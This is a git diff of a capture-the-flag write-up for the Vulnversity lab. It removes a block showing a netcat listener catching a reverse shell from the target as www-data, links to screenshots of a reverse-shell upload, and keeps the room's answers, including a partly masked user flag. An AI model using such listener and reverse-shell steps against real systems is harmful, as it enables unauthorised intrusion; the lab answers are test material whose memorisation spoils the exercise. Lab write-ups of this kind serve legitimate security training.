@@ -105,25 +105,11 @@ https://github.com/regtay/Vulnversity/blob/main/Images/Rervereshell%20upload.png
 https://github.com/regtay/Vulnversity/blob/main/Images/Upload%20.png
 
 
-
-```
-nc -lvnp 9001                                                                                   
-listening on [any] 9001 ...
-connect to [10.9.239.22] from (UNKNOWN) [10.10.123.163] 46740
-Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
-16:31:25 up  1:56,  0 users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ whoami
-www-data
-$
-
 What is the name of the user who manages the webserver? bill
 
 What is the user flag? 8bd7992fbe8a6a----------04cfcedb
 
-```
+
 
 ```
 nc -lvnp 9001
